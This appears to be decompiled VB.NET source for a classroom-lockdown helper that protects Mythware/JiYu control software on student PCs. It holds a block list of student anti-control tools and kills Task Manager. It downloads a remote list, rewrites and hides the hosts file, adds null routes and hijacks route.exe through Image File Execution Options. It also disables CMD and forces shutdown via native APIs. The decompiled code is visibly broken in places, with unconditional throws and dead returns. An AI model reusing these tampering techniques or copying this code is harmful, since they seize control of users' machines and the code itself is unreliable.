				Me.productStatus(48) = "暂 时 备 用"
				Me.productStatus(49) = "暂 时 备 用"
				Me.productStatus(50) = "暂 时 备 用"
				Me.productStatus(51) = "极域杀手"
				Me.productStatus(52) = "极域墓地制造器"
				Me.productStatus(53) = "极域杀死"
				Me.productStatus(54) = "翘课"
				Me.productStatus(55) = "夕颜若雪工具箱"
				Me.productStatus(56) = "学生机房Hack助手"
				Me.productStatus(57) = "再见极域"
				Me.productStatus(58) = "KillControl"
				Me.productStatus(59) = "去除控制"
				Me.productStatus(60) = "MsgFlood"
				Me.productStatus(61) = "极域工具包"
				Me.productStatus(62) = "Astrum For Online Classroom"
				Me.productStatus(63) = "JiYu Trainer"
				Me.productStatus(64) = "掌控课堂"
				Me.productStatus(65) = "FuckMythware"
				Me.productStatus(66) = "Hello Teacher"
				Me.productStatus(67) = "JIYUPLUS"
				Me.productStatus(68) = "极域Tool"
				Me.productStatus(69) = "微机课救星"
				Me.productStatus(70) = "极域X"
				Me.productStatus(71) = "UnMythware"
				Me.productStatus(72) = FilterStatus._ProcStatus
				Me.productStatus(73) = "BITS管理实用程序"
				Me.productStatus(74) = "DzjsTools"
				Me.productStatus(75) = "SkiesKiller"
				Me.productStatus(76) = FilterStatus.m_ConsumerStatus
				Me.productStatus(77) = "MultiDeskTop应用程序"
				Me.productStatus(78) = "极域电子教室克星"
				Me._DicStatus = 78
				Dim processesByName As Process() = Process.GetProcessesByName("taskmgr")
				processesByName(0).Kill()
				Dim query As WqlEventQuery = New WqlEventQuery("__InstanceCreationEvent", New TimeSpan(0, 0, 1), "TargetInstance ISA 'Win32_Process'")
				Me._RegStatus = New ManagementEventWatcher(query)
				AddHandler Me._RegStatus.EventArrived, AddressOf Me.CheckState
				Me._RegStatus.Start()
				Me.m_InfoStatus = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\Wow6432Node\TopDomain\e-Learning Class\Student", "ChannelId", ""))
				Me._InvocationStatus = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\Wow6432Node\TopDomain\e-Learning Class\Student", "AutoLogin", ""))
				If Me.m_InfoStatus = 0 Then
					Me.m_InfoStatus = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\TopDomain\e-Learning Class\Student", "ChannelId", ""))
					Me._InvocationStatus = Conversions.ToInteger(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\TopDomain\e-Learning Class\Student", "AutoLogin", ""))
					If Me.m_InfoStatus <> 0 Then
						Me._RuleStatus = 2
						Me.Timer_jiyu.Enabled = True
					End If
				Else
					Me._RuleStatus = 1
					Me.Timer_jiyu.Enabled = True
				End If
				If Me.m_ComposerStatus.Status = CType(0, ServiceControllerStatus) Or Me.m_ReponseStatus.Status = CType(0, ServiceControllerStatus) Then
					Me.m_RoleStatus = False
				ElseIf Me.m_ComposerStatus.Status = ServiceControllerStatus.Stopped Or Me.m_ReponseStatus.Status = ServiceControllerStatus.Stopped Then
					Me.m_ComposerStatus.Start()
					Me.m_ReponseStatus.Start()
					Thread.Sleep(1000)
					If Me.m_ComposerStatus.Status = ServiceControllerStatus.Running And Me.m_ReponseStatus.Status = ServiceControllerStatus.Running Then
						Me.m_RoleStatus = True
					End If
				End If
				Me._MockStatus = Conversions.ToString(FilterStatus.SearchState(Registry.CurrentUser, "Software", "n", ""))
				Me.fieldStatus = Conversions.ToString(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "prozs", ""))
				If Operators.CompareString(Me.fieldStatus, "", False) = 0 Then
					Me.fieldStatus = Conversions.ToString(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "prozs", ""))
				End If
				Me.m_ConnectionStatus = Conversions.ToString(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "jfglzsn", ""))
				If Operators.CompareString(Me.m_ConnectionStatus, "", False) = 0 Then
					Me.m_ConnectionStatus = Conversions.ToString(FilterStatus.SearchState(Registry.LocalMachine, "SOFTWARE\WOW6432NODE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "jfglzsn", ""))
				End If
				Me.messageStatus = Conversions.ToInteger(FilterStatus.SearchState(Registry.CurrentUser, "Software\jfglzs", "gaowei", 2))
				num12 = num2
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num12 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		Private Function InterruptState(string_0 As String) As Boolean
			Return Process.GetProcessesByName(string_0).Length > 0
		End Function

	
		Public Function GetWiredNetworkIP() As String
			Dim result As String
			Dim obj As Object
			Try

				ProjectData.ClearProjectError()

				Dim num2 As Integer = 2
				For Each networkInterface As NetworkInterface In NetworkInterface.GetAllNetworkInterfaces()
					If Not networkInterface.Description.ToLower().Contains("virtual") AndAlso networkInterface.OperationalStatus = 1 Then
						Dim enumerator As IEnumerator(Of UnicastIPAddressInformation) = networkInterface.GetIPProperties().UnicastAddresses.GetEnumerator()
						While enumerator.MoveNext()
							Dim unicastIPAddressInformation As UnicastIPAddressInformation = enumerator.Current
							If unicastIPAddressInformation.Address.AddressFamily = 2 AndAlso Not IPAddress.IsLoopback(unicastIPAddressInformation.Address) Then
								result = unicastIPAddressInformation.Address.ToString()
							End If
						End While
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End If
				Next
				result = String.Empty
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num3 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			If num3 <> 0 Then
				ProjectData.ClearProjectError()
			End If
			Return result

			Throw ProjectData.CreateProjectError(-2146828237)
		End Function

	
		Private Function CountState(string_0 As String, string_1 As String) As Integer
			Dim num As Integer = 1
			While True
				num = Strings.InStr(num, string_1, string_0, CompareMethod.Binary)
				If num = 0 Then
					Exit For
				End If
				num += 1
				num2 += 1
			End While
			Return num2
		End Function

	
		Public Function CheckProcessStatus(processName As String) As Form1.ProcessStatus
			' The following expression was wrapped in a checked-statement
			Dim result As Form1.ProcessStatus
			Try
				Dim processesByName As Process() = Process.GetProcessesByName(processName)
				If processesByName.Length = 0 Then
					result = Form1.ProcessStatus.NotFound
				Else
					Dim process As Process = processesByName(0)
					Dim num As Integer = processesByName.Length - 1
					Dim i As Integer
					i = 0
					While i <= num
						process = processesByName(i)
						If Operators.CompareString(Strings.UCase(process.MainModule.FileName), Strings.UCase(Me.m_ImporterStatus), False) = 0 Then
							Exit While
						End If
						i += 1
					End While
					If i = processesByName.Length Then
						result = Form1.ProcessStatus.NotFound
					ElseIf process.Responding Then
						If Me.ListState(process) Then
							result = Form1.ProcessStatus.Suspended
						Else
							result = Form1.ProcessStatus.Running
						End If
					Else
						result = Form1.ProcessStatus.NotResponding
					End If
				End If
			Catch ex As Exception
				result = Form1.ProcessStatus.NotResponding
			End Try
			Return result
		End Function

	
		Private Function ListState(process_0 As Process) As Boolean
			Try
				For Each obj As Object In process_0.Threads
					Dim processThread As ProcessThread = CType(obj, ProcessThread)
					If processThread.ThreadState = 5 AndAlso processThread.WaitReason = 5 Then
						Return True
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Return False
		End Function

	
		Private Sub CreateState(sender As Object, e As EventArgs)
			If Not TokenStatus.DisableState.Form4.Visible Then
				TokenStatus.DisableState.Form4.Show()
			End If
		End Sub

	
		Private Sub AssetState(sender As Object, e As FormClosingEventArgs)
			If Me._RegStatus IsNot Nothing Then
				Me._RegStatus.[Stop]()
				Me._RegStatus.Dispose()
			End If
		End Sub

	
		Private Sub VerifyState()
			TokenStatus.DisableState.Form3.shuoming.Text = "你运行的软件违规！如有误判，请老师拍照与作者QQ联系。"
			If Me._ListenerStatus = 6 Then
				TokenStatus.DisableState.Form3.shuoming.Text = "注：电脑死机时，不能用任务管理器，可同时按ctrl+alt+del三个键，点 注销 ，电脑不会自动还原。"
			End If
			If Me._QueueStatus >= 17 And Me._QueueStatus <= 21 Then
				TokenStatus.DisableState.Form3.shuoming.Text = "本电脑禁止使用解压软件，如果确有需要，请老师来退出小助手。"
			End If
			TokenStatus.DisableState.Form3.shuoming3.Text = "w4yw4y3tq3yszz" + Strings.Replace(Me.m_TokenizerStatus, ".exe", "", 1, -1, CompareMethod.Binary) + "mmfnfxhghrts"
			TokenStatus.DisableState.Form3.Show()
		End Sub

	
		Private Sub ConcatState()
			TokenStatus.DisableState.Form2.shuoming.Text = "你运行了杀毒类、虚拟机类的软件！危害电子教室运行，如有误判，请老师拍照与作者QQ联系。"
			TokenStatus.DisableState.Form2.shuoming3.Text = "gyhrw4yw4y3tq3yszz" + Strings.Replace(Me.m_TokenizerStatus, ".exe", "", 1, -1, CompareMethod.Binary) + "mmfnfxhghrts"
			TokenStatus.DisableState.Form2.Show()
			Me.Timer2.Enabled = True
		End Sub

	
		Private Sub FindState(string_0 As String, string_1 As String)
			Dim obj As Object
			Try

				ProjectData.ClearProjectError()

				Dim num2 As Integer = 2
				Dim num3 As Integer = 0
				If Me.SelectState("223.5.5.5", 1500) Then
				End If
				Me.m_ParserStatus = False
				Dim text As String = "c:\1.txt"
				Using webClient As WebClient = New WebClient()
					webClient.DownloadFile(string_0, text)
				End Using
				Dim array As String() = File.ReadAllLines(text)
				If Strings.InStr(array(0), "www.", CompareMethod.Binary) <> 0 Then
				End If
				Me.m_ParserStatus = False
										For Each left As String In array
					If Operators.CompareString(left, "视频网站：", False) = 0 Then
						num4 = num3 - 1
						num5 = num3 + 1
					End If
					If Operators.CompareString(left, "产品名：", False) = 0 Then
						num6 = num3 - 1
						num7 = num3 + 1
					End If
					If Operators.CompareString(left, "IP地址：", False) = 0 Then
						num8 = num3 - 1
						num9 = num3 + 1
					End If
					num3 += 1
				Next
				Dim num10 As Integer = num3 - 1
				File.SetAttributes(Me._ContainerStatus, FileAttributes.Normal)
				File.SetAttributes(Me._ContainerStatus, FileAttributes.Normal)
				Dim text2 As String = File.ReadAllText(Me._ContainerStatus)
				Dim hashSet As HashSet(Of String) = New HashSet(Of String)()
				Dim array3 As String() = text2.Split(New String() { Environment.NewLine }, StringSplitOptions.None)
				For Each text3 As String In array3
					If text3.Trim().StartsWith("127.0.0.1") Then
						Dim array5 As String() = text3.Trim().Split(New Char() { " "c }, StringSplitOptions.RemoveEmptyEntries)
						If array5.Length > 1 Then
							hashSet.Add(array5(1).ToLower())
						End If
					End If
				Next
				Dim stringBuilder As StringBuilder = New StringBuilder(text2)
				stringBuilder.AppendLine()
				Dim num11 As Integer = num4
				For k As Integer = 0 To num11
					If Not String.IsNullOrEmpty(array(k).Trim()) Then
						Dim text4 As String = array(k).Trim().Split(New Char() { "/"c })(0).Replace("http://", "").Replace("https://", "").ToLower()
						If Not hashSet.Contains(text4) Then
							stringBuilder.AppendLine("127.0.0.1 " + text4)
						End If
					End If
				Next
				If Operators.CompareString(string_1, "off", False) <> 0 Then
				End If
				Dim num12 As Integer = num5
				Dim num13 As Integer = num6
				For l As Integer = num12 To num13
					If Not String.IsNullOrEmpty(array(l).Trim()) Then
						Dim text5 As String = array(l).Trim().Split(New Char() { "/"c })(0).Replace("http://", "").Replace("https://", "").ToLower()
						If Not hashSet.Contains(text5) Then
							stringBuilder.AppendLine("127.0.0.1 " + text5)
						End If
					End If
				Next
				Dim num14 As Integer = Me._DicStatus + 1
				Dim num15 As Integer = num7
				Dim num16 As Integer = num8
				For m As Integer = num15 To num16
					Me.productStatus(num14) = array(m)
					num14 += 1
				Next
				FilterStatus.ComputeState(Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\route.exe")
				Dim num17 As Integer = num9
				Dim num18 As Integer = num10
				For n As Integer = num17 To num18
					Dim str As String = array(n)
					Interaction.Shell("route add  " + str + " mask 255.255.255.255 0.0.0.0 metric 1", AppWinStyle.Hide, True, -1)
				Next
				FilterStatus.ReadState(Registry.LocalMachine, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\route.exe", "Debugger", "null", 1)
				File.WriteAllText(Me._ContainerStatus, stringBuilder.ToString())
				Me.m_ParserStatus = True
				File.SetAttributes(Me._ContainerStatus, File.GetAttributes(Me._ContainerStatus) Or FileAttributes.[ReadOnly] Or FileAttributes.Hidden Or FileAttributes.System)
				FilterStatus.ReadState(Registry.CurrentUser, "Software\Policies\Microsoft\Windows\System", "DisableCMD", 0, 4)
				Interaction.Shell("ipconfig /flushdns", AppWinStyle.Hide, True, -1)
				Dim num19 As Integer = num20 + 1
				num20 = num2
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num20 = 0)
				Dim ex As Exception = CType(obj2, Exception)
			End Try
			Throw ProjectData.CreateProjectError(-2146828237)
		End Sub

	
		Private Function SelectState(string_0 As String, int_0 As Integer) As Boolean
			Dim result As Boolean
			If Not NetworkInterface.GetIsNetworkAvailable() Then
				result = False
			Else
				Try
					If New Ping().Send(string_0, int_0).Status Is Nothing Then
						result = True
					Else
						result = False
					End If
				Catch ex As Exception
					result = False
				End Try
			End If
			Return result
		End Function

	
		Public Shared Sub ForceShutdown()
			Dim num As Integer = 0
			Form1.RtlAdjustPrivilege(19, 1, 0, num)
			Form1.NtShutdownSystem(2)
		End Sub

	
		<DebuggerStepThrough()>
		Private Sub CalculateState()
			Me.decoratorStatus = New Container()
			Me.Timer1 = New Timer(Me.decoratorStatus)
			Me.Timer2 = New Timer(Me.decoratorStatus)
			Me.Timer_main = New Timer(Me.decoratorStatus)
			Me.Timer_usb = New Timer(Me.decoratorStatus)
			Me.Timer_dzjs = New Timer(Me.decoratorStatus)
			Me.Timer_wangluo = New Timer(Me.decoratorStatus)
			Me.Timer_jcm = New Timer(Me.decoratorStatus)
			Me.Timer_fhq = New Timer(Me.decoratorStatus)
			Me.Timer_qdx = New Timer(Me.decoratorStatus)
			Me.Timer4 = New Timer(Me.decoratorStatus)
			Me.Timer_jiyu = New Timer(Me.decoratorStatus)
			Me.Timer3 = New Timer(Me.decoratorStatus)
			Me.Timer_updatehosts = New Timer(Me.decoratorStatus)
			Me.Timer_route = New Timer(Me.decoratorStatus)
			MyBase.SuspendLayout()
			Me.Timer1.Interval = 6000
			Me.Timer2.Interval = 1000
			Me.Timer_main.Enabled = True
			Me.Timer_main.Interval = 3000
			Me.Timer_usb.Interval = 5000
			Me.Timer_dzjs.Interval = 16000
			Me.Timer_wangluo.Interval = 17000
			Me.Timer_jcm.Interval = 5000
			Me.Timer_fhq.Interval = 13000
			Me.Timer_qdx.Interval = 3000
			Me.Timer4.Interval = 1000
			Me.Timer_jiyu.Interval = 15000
			Me.Timer3.Interval = 1000
			Me.Timer_updatehosts.Interval = 10000
			Me.Timer_route.Interval = 11000
			MyBase.AutoScaleDimensions = New SizeF(6F, 12F)
			MyBase.AutoScaleMode = AutoScaleMode.Font
			MyBase.ClientSize = New Size(384, 379)
			MyBase.FormBorderStyle = FormBorderStyle.None
			MyBase.Name = "Form1"
			MyBase.ShowInTaskbar = False
			MyBase.WindowState = FormWindowState.Minimized
			MyBase.ResumeLayout(False)
		End Sub

	
		' (get) Token: 0x06000051 RID: 81 RVA: 0x000024D8 File Offset: 0x000006D8
		' (set) Token: 0x06000052 RID: 82 RVA: 0x00006A8C File Offset: 0x00004C8C
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me.configStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.MapState
				Dim timer As Timer = Me.configStatus
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me.configStatus = value
				timer = Me.configStatus
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000053 RID: 83 RVA: 0x000024E0 File Offset: 0x000006E0
		' (set) Token: 0x06000054 RID: 84 RVA: 0x00006AD0 File Offset: 0x00004CD0
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me.creatorStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.ValidateState
				Dim timer As Timer = Me.creatorStatus
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me.creatorStatus = value
				timer = Me.creatorStatus
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000055 RID: 85 RVA: 0x000024E8 File Offset: 0x000006E8
		' (set) Token: 0x06000056 RID: 86 RVA: 0x00006B14 File Offset: 0x00004D14
		Friend Overridable Property Timer_main As Timer
			<CompilerGenerated()>
			Get
				Return Me._TestsStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.CompareState
				Dim testsStatus As Timer = Me._TestsStatus
				If testsStatus IsNot Nothing Then
					RemoveHandler testsStatus.Tick, value2
				End If
				Me._TestsStatus = value
				testsStatus = Me._TestsStatus
				If testsStatus IsNot Nothing Then
					AddHandler testsStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000057 RID: 87 RVA: 0x000024F0 File Offset: 0x000006F0
		' (set) Token: 0x06000058 RID: 88 RVA: 0x00006B58 File Offset: 0x00004D58
		Friend Overridable Property Timer_usb As Timer
			<CompilerGenerated()>
			Get
				Return Me._ParamsStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.SortState
				Dim paramsStatus As Timer = Me._ParamsStatus
				If paramsStatus IsNot Nothing Then
					RemoveHandler paramsStatus.Tick, value2
				End If
				Me._ParamsStatus = value
				paramsStatus = Me._ParamsStatus
				If paramsStatus IsNot Nothing Then
					AddHandler paramsStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000059 RID: 89 RVA: 0x000024F8 File Offset: 0x000006F8
		' (set) Token: 0x0600005A RID: 90 RVA: 0x00006B9C File Offset: 0x00004D9C
		Friend Overridable Property Timer_dzjs As Timer
			<CompilerGenerated()>
			Get
				Return Me.m_ProducerStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.ResolveState
				Dim producerStatus As Timer = Me.m_ProducerStatus
				If producerStatus IsNot Nothing Then
					RemoveHandler producerStatus.Tick, value2
				End If
				Me.m_ProducerStatus = value
				producerStatus = Me.m_ProducerStatus
				If producerStatus IsNot Nothing Then
					AddHandler producerStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x0600005B RID: 91 RVA: 0x00002500 File Offset: 0x00000700
		' (set) Token: 0x0600005C RID: 92 RVA: 0x00006BE0 File Offset: 0x00004DE0
		Friend Overridable Property Timer_wangluo As Timer
			<CompilerGenerated()>
			Get
				Return Me.m_BroadcasterStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.ExcludeState
				Dim broadcasterStatus As Timer = Me.m_BroadcasterStatus
				If broadcasterStatus IsNot Nothing Then
					RemoveHandler broadcasterStatus.Tick, value2
				End If
				Me.m_BroadcasterStatus = value
				broadcasterStatus = Me.m_BroadcasterStatus
				If broadcasterStatus IsNot Nothing Then
					AddHandler broadcasterStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x0600005D RID: 93 RVA: 0x00002508 File Offset: 0x00000708
		' (set) Token: 0x0600005E RID: 94 RVA: 0x00002510 File Offset: 0x00000710
		Friend Overridable Property Timer_jcm As Timer

	
		' (get) Token: 0x0600005F RID: 95 RVA: 0x00002519 File Offset: 0x00000719
		' (set) Token: 0x06000060 RID: 96 RVA: 0x00006C24 File Offset: 0x00004E24
		Friend Overridable Property Timer_fhq As Timer
			<CompilerGenerated()>
			Get
				Return Me._ProxyStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.InstantiateState
				Dim proxyStatus As Timer = Me._ProxyStatus
				If proxyStatus IsNot Nothing Then
					RemoveHandler proxyStatus.Tick, value2
				End If
				Me._ProxyStatus = value
				proxyStatus = Me._ProxyStatus
				If proxyStatus IsNot Nothing Then
					AddHandler proxyStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000061 RID: 97 RVA: 0x00002521 File Offset: 0x00000721
		' (set) Token: 0x06000062 RID: 98 RVA: 0x00006C68 File Offset: 0x00004E68
		Friend Overridable Property Timer_qdx As Timer
			<CompilerGenerated()>
			Get
				Return Me._MerchantStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.DestroyState
				Dim merchantStatus As Timer = Me._MerchantStatus
				If merchantStatus IsNot Nothing Then
					RemoveHandler merchantStatus.Tick, value2
				End If
				Me._MerchantStatus = value
				merchantStatus = Me._MerchantStatus
				If merchantStatus IsNot Nothing Then
					AddHandler merchantStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000063 RID: 99 RVA: 0x00002529 File Offset: 0x00000729
		' (set) Token: 0x06000064 RID: 100 RVA: 0x00006CAC File Offset: 0x00004EAC
		Friend Overridable Property Timer4 As Timer
			<CompilerGenerated()>
			Get
				Return Me._TestStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.CreateState
				Dim testStatus As Timer = Me._TestStatus
				If testStatus IsNot Nothing Then
					RemoveHandler testStatus.Tick, value2
				End If
				Me._TestStatus = value
				testStatus = Me._TestStatus
				If testStatus IsNot Nothing Then
					AddHandler testStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000065 RID: 101 RVA: 0x00002531 File Offset: 0x00000731
		' (set) Token: 0x06000066 RID: 102 RVA: 0x00006CF0 File Offset: 0x00004EF0
		Friend Overridable Property Timer_jiyu As Timer
			<CompilerGenerated()>
			Get
				Return Me.callbackStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.InsertState
				Dim timer As Timer = Me.callbackStatus
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me.callbackStatus = value
				timer = Me.callbackStatus
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x06000067 RID: 103 RVA: 0x00002539 File Offset: 0x00000739
		' (set) Token: 0x06000068 RID: 104 RVA: 0x00002541 File Offset: 0x00000741
		Friend Overridable Property Timer3 As Timer

	
		' (get) Token: 0x06000069 RID: 105 RVA: 0x0000254A File Offset: 0x0000074A
		' (set) Token: 0x0600006A RID: 106 RVA: 0x00006D34 File Offset: 0x00004F34
		Friend Overridable Property Timer_updatehosts As Timer
			<CompilerGenerated()>
			Get
				Return Me._ItemStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.OrderState
				Dim itemStatus As Timer = Me._ItemStatus
				If itemStatus IsNot Nothing Then
					RemoveHandler itemStatus.Tick, value2
				End If
				Me._ItemStatus = value
				itemStatus = Me._ItemStatus
				If itemStatus IsNot Nothing Then
					AddHandler itemStatus.Tick, value2
				End If
			End Set
		End Property

	
		' (get) Token: 0x0600006B RID: 107 RVA: 0x00002552 File Offset: 0x00000752
		' (set) Token: 0x0600006C RID: 108 RVA: 0x00006D78 File Offset: 0x00004F78
		Friend Overridable Property Timer_route As Timer
			<CompilerGenerated()>
			Get
				Return Me.facadeStatus
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.DefineState
				Dim timer As Timer = Me.facadeStatus
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me.facadeStatus = value
				timer = Me.facadeStatus
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

	
		Private _CustomerStatus As Long

	
		Private _ExpressionStatus As Long

	
		Private _RecordStatus As Boolean

	
		Private _AttributeStatus As Boolean

	
		Private stubStatus As Boolean

	
		Private _PolicyStatus As Boolean

	
		Private m_AuthenticationStatus As Boolean

	
		Private m_SingletonStatus As Boolean

	
		Private m_ComparatorStatus As Boolean

	
		Private _ListStatus As Boolean

	
		Private _RequestStatus As Boolean

	
		Private m_ObjectStatus As Boolean

	
		Private _ServerStatus As Boolean

	
		Private _GetterStatus As String

	
		Private _PropertyStatus As String

	
		Private m_MapStatus As String

	
		Private _RepositoryStatus As String

	
		Private _AccountStatus As String()

	
		Private classStatus As String()

	
		Private productStatus As String()

	
		Private _DicStatus As Integer

	
		Private _RegistryStatus As String

	
		Private m_PredicateStatus As String

	
		Private annotationStatus As Integer

	
		Private m_OrderStatus As Integer

	
		Private refStatus As String

	
		Private _PoolStatus As Integer

	
		Private m_IndexerStatus As Integer

	
		Private collectionStatus As Integer

	
		Private bridgeStatus As Integer

	
		Private m_ValueStatus As Integer

	
		Private _ProcessStatus As Integer

	
		Private m_TaskStatus As Integer

	
		Private _ExceptionStatus As Integer

	
		Private systemStatus As Integer

	
		Private m_ValStatus As Integer

	
		Private m_CandidateStatus As Integer

	
		Private methodStatus As Long

	
		Private m_InfoStatus As Integer

	
		Private _InvocationStatus As Integer

	
		Private _RuleStatus As Integer

	
		Private m_RoleStatus As Boolean

	
		Private _MockStatus As String

	
		Private fieldStatus As String

	
		Private m_ConnectionStatus As String

	
		Private m_MapperStatus As String

	
		Private m_ComposerStatus As ServiceController

	
		Private m_ReponseStatus As ServiceController

	
		Private _InstanceStatus As String

	
		Private _ListenerStatus As Integer

	
		Private messageStatus As Integer

	
		Private helperStatus As String

	
		Private m_ParserStatus As Boolean

	
		Private printerStatus As String

	
		Private _FactoryStatus As String

	
		Private _ContainerStatus As String

	
		Private _QueueStatus As Integer

	
		Public Const WM_DEVICECHANGE As Integer = 537

	
		Public Const DBT_DEVICEARRIVAL As Integer = 32768

	
		Public Const DBT_CONFIGCHANGECANCELED As Integer = 25

	
		Public Const DBT_CONFIGCHANGED As Integer = 24

	
		Public Const DBT_CUSTOMEVENT As Integer = 32774

	
		Public Const DBT_DEVICEQUERYREMOVE As Integer = 32769

	
		Public Const DBT_DEVICEQUERYREMOVEFAILED As Integer = 32770

	
		Public Const DBT_DEVICEREMOVECOMPLETE As Integer = 32772

	
		Public Const DBT_DEVICEREMOVEPENDING As Integer = 32771

	
		Public Const DBT_DEVICETYPESPECIFIC As Integer = 32773

	
		Public Const DBT_DEVNODES_CHANGED As Integer = 7

	
		Public Const DBT_QUERYCHANGECONFIG As Integer = 23

	
		Public Const DBT_USERDEFINED As Integer = 65535

	
		Private _RegStatus As ManagementEventWatcher

	
		Private m_TokenizerStatus As String

	
		Private m_ResolverStatus As String

	
		Private m_ImporterStatus As String

	
		Private attrStatus As String

	
		Private Const m_ParamStatus As Integer = 19

	
		Private Const tagStatus As Integer = 0

	
		Private Const _AdapterStatus As Integer = 1

	
		Private Const m_PrototypeStatus As Integer = 2

	
		Private Const descriptorStatus As Integer = 2

	
		Private Const _PageStatus As Byte = 17

	
		Private Const m_IdentifierStatus As Byte = 76

	
		Private Const exporterStatus As Byte = 67

	
		Private Const m_WrapperStatus As Byte = 87

	
		Private Const _IteratorStatus As Byte = 18

	
		Private Const m_VisitorStatus As Byte = 115

	
		Private Const publisherStatus As Byte = 27

	
		Private m_ObserverStatus As List(Of String)

	
		Private _UtilsStatus As List(Of String)

	
		Private m_WorkerStatus As String

	
		Private m_MappingStatus As Long

	
		Private _AdvisorStatus As Long

	
		Private _ErrorStatus As String

	
		Private contextStatus As Boolean

	
		<CompilerGenerated()>
		<AccessedThroughProperty("Timer1")>
		Private configStatus As Timer

	
		<AccessedThroughProperty("Timer2")>
		<CompilerGenerated()>
		Private creatorStatus As Timer

	
		<AccessedThroughProperty("Timer_main")>
		<CompilerGenerated()>
		Private _TestsStatus As Timer

	
		<CompilerGenerated()>
		<AccessedThroughProperty("Timer_usb")>
		Private _ParamsStatus As Timer

	
		<CompilerGenerated()>
		<AccessedThroughProperty("Timer_dzjs")>
		Private m_ProducerStatus As Timer

	
		<AccessedThroughProperty("Timer_wangluo")>
		<CompilerGenerated()>
		Private m_BroadcasterStatus As Timer

	
		<AccessedThroughProperty("Timer_jcm")>
		<CompilerGenerated()>
		Private m_ParameterStatus As Timer

	
		<AccessedThroughProperty("Timer_fhq")>
		<CompilerGenerated()>
		Private _ProxyStatus As Timer

	
		<AccessedThroughProperty("Timer_qdx")>
		<CompilerGenerated()>
		Private _MerchantStatus As Timer

	
		<AccessedThroughProperty("Timer4")>
		<CompilerGenerated()>
		Private _TestStatus As Timer

	
		<AccessedThroughProperty("Timer_jiyu")>
		<CompilerGenerated()>
		Private callbackStatus As Timer

	
		<CompilerGenerated()>
		<AccessedThroughProperty("Timer3")>
		Private _ConfigurationStatus As Timer

	
